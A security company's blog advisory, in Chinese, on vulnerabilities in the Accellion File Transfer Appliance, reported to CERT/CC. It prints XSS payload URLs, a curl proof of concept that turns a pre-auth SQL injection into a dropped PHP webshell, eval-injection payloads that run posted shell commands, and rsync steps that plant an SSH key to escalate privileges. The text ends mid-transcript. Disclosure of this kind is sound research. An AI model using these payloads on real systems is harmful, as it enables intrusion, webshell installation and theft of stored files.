
<!DOCTYPE html>
<html lang="zh-TW">
  <head>
    <meta charset="utf-8" />
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>Accellion File Transfer Appliance 弱點報告 | DEVCORE 戴夫寇爾</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
    <meta name="description" property="og:description" content="根據公開資料掃描，全球共發現 1217 台 FTA 存活主機，主要分布地點為美國，其次加拿大、澳洲、英國與新加坡。 根據存活主機的域名、SSL Certificate 發現 FTA 使用客戶遍及政府、教育、企業等領域，其中不乏一些知名品牌。" />
    <meta name="keywords" content="Advisory, Facebook, BugBounty, RCE, CVE" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="Accellion File Transfer Appliance 弱點報告 | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20160922/Accellion.jpeg" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Accellion File Transfer Appliance 弱點報告 | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="根據公開資料掃描，全球共發現 1217 台 FTA 存活主機，主要分布地點為美國，其次加拿大、澳洲、英國與新加坡。 根據存活主機的域名、SSL Certificate 發現 FTA 使用客戶遍及政府、教育、企業等領域，其中不乏一些知名品牌。">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20160922/Accellion.jpeg">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
    <link rel="publisher" href="https://plus.google.com/118439315679478709768/" />

  </head>
  <body>
    <div class="page">
      <div class="container--wrapper">
        <div class="topbar">
          <div class="topbar__brand">
            <a href="/">
                <div class="logo">
                  DEVCORE 戴夫寇爾
                </div></a>
            <p class="slogan">
              我們提供<a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務
            </p>
          </div>
          <div class="drawer" id="drawer">
            <div class="drawer__container">
              <nav class="main-menu">
                <div class="hidden">
                  主選單
                </div>
                <a href="/services/penetration-test" class="main-menu__link mobile-only">滲透測試</a>
                <a href="/services/red-team" class="main-menu__link mobile-only">紅隊演練</a>
                <a href="/services/security-consulting" class="main-menu__link mobile-only">資安顧問</a>
                <a href="/services/security-training" class="main-menu__link mobile-only">教育訓練</a>
                <a href="/about/" class="main-menu__link">駭客思維</a><a href="/blog/" class="main-menu__link">最新訊息</a><a href="/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">搜尋</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
              </nav>
              <a href="/contact/" class="drawer__contact button--dense">聯絡我們</a>
              <nav class="lang-menu">
                <div class="lang-menu__label">
                  語言:
                </div>
                <a href="/" class="lang-menu__link">中文</a>
                <a href="/en/" class="lang-menu__link">English</a>
              </nav>
            </div>
          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
            <div class="bars">
              <div class="bar"></div>
              <div class="bar"></div>
              <div class="bar"></div>
            </div>
          </button>
        </div>
      </div><main role="main">


          <div class="container--wrapper">
            <div class="container">
              <section class="blog-header">
                <small class="blog-header__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
                <img src="https://devco.re/assets/img/blog/20160922/Accellion.jpeg" class="blog-header__image" alt="Accellion File Transfer Appliance 弱點報告" />
                <h1 class="blog-header__title">
                  Accellion File Transfer Appliance 弱點報告
                </h1>
                <div class="blog-header__tags">
                  
                  <a href="/blog/tag/Advisory/" class="blog-header__tag">Advisory</a><a href="/blog/tag/Facebook/" class="blog-header__tag">Facebook</a><a href="/blog/tag/BugBounty/" class="blog-header__tag">BugBounty</a><a href="/blog/tag/RCE/" class="blog-header__tag">RCE</a><a href="/blog/tag/CVE/" class="blog-header__tag">CVE</a>
                </div>
          
          
                <p class="blog-header__info">
                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/blog/author/orange" class="author-name">Orange Tsai</a> <time class="date">on 2016-09-22 </time>
                </p>
          
              </section>
              <article class="article">
          <p>By <a href="http://blog.orange.tw/">Orange Tsai</a></p>

<p><a href="/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/">English Version</a>   <br />
<a href="/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/">中文版本</a></p>

<hr />

<h3 id="accellion-fta-介紹">Accellion FTA 介紹</h3>
<p><br /><br />
Accellion File Transfer Appliance (以下簡稱 FTA) 為一款安全檔案傳輸服務，可讓使用者線上分享、同步檔案，且所有檔案皆經 AES 128/256 加密，Enterprise 版本更支援 SSL VPN 服務並整合 AD, LDAP, Kerberos 等 Single Sign-on 機制。<br />
<br /></p>

<!-- more -->

<h3 id="漏洞描述">漏洞描述</h3>
<p><br /><br />
在研究過程中，於 FTA 版本 FTA_9_12_0 (13-Oct-2015 Release) 上，發現了下列弱點：</p>

<ul>
  <li>Cross-Site Scripting x 3</li>
  <li>Pre-Auth SQL Injection leads to Remote Code Execution</li>
  <li>Known-Secret-Key leads to Remote Code Execution</li>
  <li>Local Privilege Escalation x 2</li>
</ul>

<p>以上弱點可使不需經過認證的攻擊者，成功遠端攻擊 FTA 伺服器並取得最高權限，當攻擊者完全控制伺服器後，可取得伺服器上的加密檔案與用戶資料等。</p>

<p>弱點經回報 CERT/CC 後取得共四個獨立 CVE 編號 (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353)。<br />
<br /></p>

<h3 id="影響範圍">影響範圍</h3>
<p><br /><br />
根據公開資料掃描，全球共發現 1217 台 FTA 存活主機，主要分布地點為美國，其次加拿大、澳洲、英國與新加坡。根據存活主機的域名、SSL Certificate 發現 FTA 使用客戶遍及政府、教育、企業等領域，其中不乏一些知名品牌。<br />
<br /></p>

<h3 id="漏洞分析與利用">漏洞分析與利用</h3>
<p><br /></p>

<h4 id="multiple-cross-site-scripting-cve-2016-2350">Multiple Cross-Site Scripting (CVE-2016-2350)</h4>

<h5 id="1-xss-in-move_partition_framehtml">1. XSS in move_partition_frame.html</h5>

<blockquote>
  <p>https://&lt;fta&gt;/courier/move_partition_frame.html<br /><br />
?f2=’-prompt(document.domain);//</p>
</blockquote>

<h5 id="2-xss-in-getimageajaxphp">2. XSS in getimageajax.php</h5>

<blockquote>
  <p>https://&lt;fta&gt;/courier/web/getimageajax.php<br /><br />
?documentname=”onerror=”prompt(document.domain)//</p>
</blockquote>

<h5 id="3-xss-in-wminfohtml">3. XSS in wmInfo.html</h5>

<blockquote>
  <p>https://&lt;fta&gt;/courier/web/wmInfo.html<br /><br />
?msg=ssologout<br /><br />
&amp;loginurl=”&gt;&lt;svg/onload=”prompt(document.domain)</p>
</blockquote>

<p><br /></p>

<h4 id="pre-auth-sql-injection-leads-to-rce-cve-2016-2351">Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)</h4>

<p>經過代碼審查後，在 FTA 中發現一個不須驗證的 SQL Injection，這使得惡意使用者可透過 SQL Injection 存取伺服器的敏感檔案及個人資料，並配合權限設定問題導致遠端代碼執行。問題出在 security_key2.api 中所呼叫到的 <code class="highlighter-rouge">client_properties( ... )</code> 函數中！</p>

<div class="highlight-name">/home/seos/courier/security_key2.api</div>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="c1">// ...</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="nx">_decrypt</span><span class="p">(</span> <span class="nv">$password</span><span class="p">,</span> <span class="nx">_generate_key</span><span class="p">(</span> <span class="nv">$g_app_id</span><span class="p">,</span> <span class="nv">$client_id</span><span class="p">,</span> <span class="nv">$g_username</span> <span class="p">)</span> <span class="p">);</span>
<span class="nx">opendb</span><span class="p">();</span>
<span class="nv">$client_info</span> <span class="o">=</span> <span class="nx">client_properties</span><span class="p">(</span> <span class="nv">$client_id</span> <span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
<span class="c1">// ...</span></code></pre></div>

<p>其中 <code class="highlighter-rouge">$g_app_id</code> <code class="highlighter-rouge">$g_username</code> <code class="highlighter-rouge">$client_id</code> <code class="highlighter-rouge">$password</code> 皆為攻擊者可控參數，雖然有個 <code class="highlighter-rouge">_decrypt( ... )</code> 函數對密碼進行處理，但是與弱點觸發並無相關。其中要注意是 <code class="highlighter-rouge">$g_app_id</code> 的值會被代入成全域變數，代表當前使用的 Application ID，並且在 <code class="highlighter-rouge">opendb( )</code> 使用，其中在 <code class="highlighter-rouge">opendb( )</code> 內有以下代碼：</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$db</span> <span class="o">=</span> <span class="nx">DB_MASTER</span> <span class="o">.</span> <span class="nv">$g_app_id</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">mysql_select_db</span><span class="p">(</span> <span class="nv">$db</span> <span class="p">))</span></code></pre></div>

<p><code class="highlighter-rouge">mysql_select_db</code> 中所開啟資料庫的名稱由使用者可控，如給錯誤的值將導致程式無法繼續執行下去，所以必須將 <code class="highlighter-rouge">$g_app_id</code> 偽造成正確的內容。</p>

<p>接著是最主要的函數 <code class="highlighter-rouge">client_properties( $client_id )</code></p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">client_properties</span><span class="p">(</span><span class="nv">$client_id</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$user</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$manager</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$client_type</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$client_name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$order_by</span> <span class="o">=</span> <span class="s1">&#39;client_id&#39;</span><span class="p">,</span> <span class="nv">$order_type</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="nv">$limit</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$exclude_del</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$user_type</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$user_status</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$user_type</span>  <span class="o">=</span> <span class="s1">&#39;&#39;</span> <span class="o">?</span> <span class="s1">&#39;SELECT t_mail_server.* FROM t_mail_server &#39;</span> <span class="o">:</span> <span class="s1">&#39;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &#39;</span><span class="p">);</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;client_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$client_id</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;client_name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$client_name</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;client_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$client_type</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">mysql_escape_like</span><span class="p">(</span> <span class="nv">$user</span> <span class="p">);</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;user_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user_type</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;manager&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$manager</span><span class="p">;</span>
    <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;user_status&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user_status</span><span class="p">;</span>
    <span class="nv">$sql</span> <span class="o">&amp;=</span> <span class="nx">construct_where_clause</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">,</span> <span class="nv">$exclude_del</span> <span class="p">);</span>

    <span class="c1">// ...</span>

    <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  <span class="p">);</span>
    <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span> <span class="nv">$sql</span> <span class="p">);</span>
    <span class="p">(</span> <span class="nv">$db_result</span> <span class="o">=</span>  <span class="o">||</span> <span class="nx">fatal_error</span><span class="p">(</span> <span class="s1">&#39;exec:mysql_query(&#39;</span> <span class="o">.</span> <span class="nv">$sql</span> <span class="o">.</span> <span class="s1">&#39;) respond:&#39;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">(</span>  <span class="p">),</span> <span class="k">__FILE__</span><span class="p">,</span> <span class="mi">221</span> <span class="p">)</span> <span class="p">);</span></code></pre></div>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">construct_where_clause</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span> <span class="nv">$exclude_del</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$where_clause</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  <span class="p">);</span>
    <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;c_server_id  != \&#39;999\&#39;&#39;</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$exclude_del</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;!(t_mail_server.c_flag &amp; &#39;</span> <span class="o">.</span> <span class="nx">CLIENT_DELETED</span> <span class="o">.</span> <span class="s1">&#39;)&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;client_id&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;c_server_id = \&#39;&#39;</span> <span class="o">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;client_id&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;\&#39;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;manager&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;manager&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;manager&#39;</span><span class="p">]</span> <span class="p">);</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;c_manager = \&#39;&#39;</span> <span class="o">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;manager&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;\&#39;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;client_name&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;client_name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;client_name&#39;</span><span class="p">]</span> <span class="p">);</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;t_mail_server.c_name LIKE \&#39;%&#39;</span> <span class="o">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;client_name&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;%\&#39;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">((</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;%%&#39;</span> <span class="p">))</span> <span class="p">{</span>
        <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="p">);</span>
        <span class="nv">$where_clause</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;t_mail_server.c_user_id LIKE \&#39;&#39;</span> <span class="o">.</span> <span class="nv">$filter</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;\&#39;&#39;</span><span class="p">;</span>
    <span class="p">}</span></code></pre></div>

<p><code class="highlighter-rouge">client_properties( ... )</code> 中會將所傳進的參數進行 SQL 語句的拼裝，而 <code class="highlighter-rouge">construct_where_clause( ... )</code> 為最關鍵的一個函數。<br />
在 <code class="highlighter-rouge">construct_where_clause( ... )</code> 中可以看到參數皆使用 <code class="highlighter-rouge">mysql_real_escape_string</code> 來防禦但唯獨缺少 <code class="highlighter-rouge">$client_id</code>，從原始碼的 Coding Style 觀察猜測應該是開發時的疏忽，因此根據程式流程送出對應的參數即可觸發 SQL Injection。</p>

<p>此外，在 FTA 中資料庫使用者為 root 具有 FILE_PRIV 權限，因此可使用 <code class="highlighter-rouge">INTO OUTFILE</code> 撰寫自己 PHP 代碼至可寫目錄達成遠端代碼執行！</p>

<p><strong>PoC</strong></p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>curl https://&lt;fta&gt;/courier/1000@/security_key2.api -d <span class="s2">&quot;aid=1000&amp;user_id=1&amp;password=1&amp;client_id=&#39; OR 1=1 LIMIT 1 INTO OUTFILE &#39;/home/seos/courier/themes/templates/.cc.php&#39; LINES TERMINATED BY 0x3c3f...#&quot;</span></code></pre></div>

<p>生成的 PHP 檔案位置在</p>

<blockquote>
  <p>http://&lt;fta&gt;/courier/themes/templates/.cc.php</p>
</blockquote>

<p><br /></p>

<h4 id="known-secret-key-leads-to-remote-code-execution">Known Secret-Key leads to Remote Code Execution</h4>

<p>在前個弱點中，要達成遠端代碼執行還有一個條件是要存在可寫目錄，但現實中有機率找不到可寫的目錄放置 Webshell，因此無法從 SQL Injection 達成代碼執行，不過這時有另外一條路可以幫助我們達成遠端代碼執行。</p>

<p>這個弱點的前提條件是 <strong>已知資料庫中所存的加密 KEY</strong></p>

<p>這點對我們來說不是問題，從前面的 SQL Injection 弱點可任意讀取資料庫內容，另外雖然在程式碼中有對參數進行一些過濾，但那些過濾是可以繞過的！</p>

<div class="highlight-name">/home/seos/courier/sfUtils.api</div>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="nv">$func_call</span> <span class="o">=</span> <span class="nx">decrypt</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fc&#39;</span><span class="p">]</span> <span class="p">);</span>
<span class="nv">$orig_func</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span> <span class="s1">&#39;/(.+)\(.*\)/&#39;</span><span class="p">,</span> <span class="nv">$func_call</span><span class="p">,</span> <span class="nv">$func_match</span> <span class="p">))</span> <span class="p">{</span>
    <span class="nv">$orig_func</span> <span class="o">=</span> <span class="nv">$func_call</span><span class="p">;</span>
    <span class="nv">$func_call</span> <span class="o">=</span> <span class="nv">$func_match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>
<span class="nv">$cs_method</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s1">&#39;delete_session_cache&#39;</span><span class="p">,</span> <span class="s1">&#39;delete_user_contact&#39;</span><span class="p">,</span> <span class="s1">&#39;valid_password&#39;</span><span class="p">,</span> <span class="s1">&#39;user_password_update_disallowed&#39;</span><span class="p">,</span> <span class="s1">&#39;user_password_format_disallowed&#39;</span><span class="p">,</span> <span class="s1">&#39;get_user_contact_list&#39;</span><span class="p">,</span> <span class="s1">&#39;user_email_verified&#39;</span><span class="p">,</span> <span class="s1">&#39;user_exist_allow_direct_download&#39;</span><span class="p">,</span> <span class="s1">&#39;user_profile_auth&#39;</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">((</span> <span class="o">!</span><span class="nv">$func_call</span> <span class="o">||</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span> <span class="nv">$func_call</span><span class="p">,</span> <span class="nv">$cs_method</span> <span class="p">)</span> <span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$orig_func</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$func_call</span> <span class="o">=</span> <span class="nv">$orig_func</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$func_call</span>  <span class="o">==</span> <span class="s1">&#39;get_user_contact_list&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_csinfo</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span> <span class="s1">&#39;/[\\\/&quot;\*\:\?\&lt;\&gt;\|&amp;]/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$func_call</span> <span class="o">=</span> <span class="s1">&#39;echo(count(&#39;</span> <span class="o">.</span> <span class="nv">$func_call</span> <span class="o">.</span> <span class="s1">&#39;(&quot;&#39;</span> <span class="o">.</span> <span class="nv">$_csinfo</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&quot;, array(&quot;nickname&quot;=&gt;&quot;&#39;</span> <span class="o">.</span> <span class="nb">addslashes</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;))));&#39;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span>
        <span class="nv">$func_param</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  <span class="p">);</span>
        <span class="nv">$p_no</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p&#39;</span> <span class="o">.</span> <span class="nv">$p_no</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span>
            <span class="nv">$func_param</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;\\\&#39;&#39;</span><span class="p">,</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">&#39;$&#39;</span><span class="p">,</span> <span class="s1">&#39;\\$&#39;</span><span class="p">,</span> <span class="nb">addslashes</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p&#39;</span> <span class="o">.</span> <span class="nv">$p_no</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
            <span class="o">++</span><span class="nv">$p_no</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$func_call</span> <span class="o">=</span> <span class="s1">&#39;echo(&#39;</span> <span class="o">.</span> <span class="nv">$func_call</span> <span class="o">.</span> <span class="s1">&#39;(&quot;&#39;</span> <span class="o">.</span> <span class="nb">join</span><span class="p">(</span> <span class="s1">&#39;&quot;, &quot;&#39;</span><span class="p">,</span> <span class="nv">$func_param</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;));&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span> <span class="nv">$func_call</span> <span class="p">);</span></code></pre></div>

<p>如果已知加密 KEY 的話，即可控制 <code class="highlighter-rouge">decrypt( $_POST[fc] )</code> 的輸出，而後面的正規表示式雖然針對函數名稱進行白名單過濾，但是沒對參數進行過濾，如此一來我們可以在參數的部分插入任意代碼，唯一的條件就是不能有 <code class="highlighter-rouge">(</code> <code class="highlighter-rouge">)</code> 出現，但由於 PHP 的鬆散特性，玩法其實很多，這裡列舉兩個：</p>

<p><br /><br />
直接透過反引號執行系統指令：</p>

<blockquote>
  <p>user_profile_auth(`$_POST[cmd]`);</p>
</blockquote>

<p><br /><br />
更優雅的方式可以透過 include 語法引入上傳檔案的 tmp_name，這樣各種保護都不用擔心：</p>

<blockquote>
  <p>user_profile_auth(include $_FILES[file][tmp_name]);</p>
</blockquote>

<p><br /></p>

<h4 id="local-privilege-escalation-cve-2016-2352-and-cve-2016-2353">Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)</h4>
<p>在取得 PHP 網頁權限後，發現所屬權限為 nobody，為了進行更深入的研究，在對環境進行審視後，發現兩個可用來提升權限之弱點。</p>

<h5 id="1-rsync-配置錯誤">1. Rsync 配置錯誤</h5>

<div class="highlight-name">/etc/opt/rsyncd.conf</div>

<div class="highlight"><pre><code class="language-lighttpd" data-lang="lighttpd"><span class="k">log</span> <span class="k">file</span> <span class="o">=</span> <span class="n">/home/soggycat/log/kennel.log</span>
<span class="k">...</span>
<span class="p">[</span><span class="k">soggycat</span><span class="p">]</span>
<span class="k">path</span> <span class="o">=</span> <span class="n">/home/soggycat</span>
<span class="k">uid</span> <span class="o">=</span> <span class="k">soggycat</span>
<span class="k">read</span> <span class="k">only</span> <span class="o">=</span> <span class="k">false</span>
<span class="k">list</span> <span class="o">=</span> <span class="k">false</span>
<span class="k">...</span></code></pre></div>

<p>其中模組名稱 soggycat 對 <code class="highlighter-rouge">/home/soggycat/</code> 為任何人可讀可寫，所以可將 SSH Key 寫至 /home/soggycat/.ssh/ 後以 soggycat 身分登入</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bash-3.2<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span>

bash-3.2<span class="nv">$ </span>rsync 0::soggycat/.ssh/
drwx------        <span class="m">4096</span> 2016/01/29 18:13:41 .
-rw-r--r--         <span class="m">606</span> 2016/01/29 18:13:41 authorized_keys

bash-3.2<span class="nv">$ </span>rsync 0::soggycat/.ssh/authorized_keys .
bash-3.2<span class="nv">$ </span>cat id_dsa.pub &gt;&gt; authorized_keys
bash-3.2<span class="nv">$ </span>rsync authorized_keys 0::soggycat/.ssh/

bash-3.2<span class="nv">$ </span>ssh -i id_dsa -o <span class="nv">UserKnownHostsFile</span><span class="o">=</span>/dev/null -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no soggycat@localhost id
Could not create directory <span class="s1">&#39;/.ssh&#39;</span>.
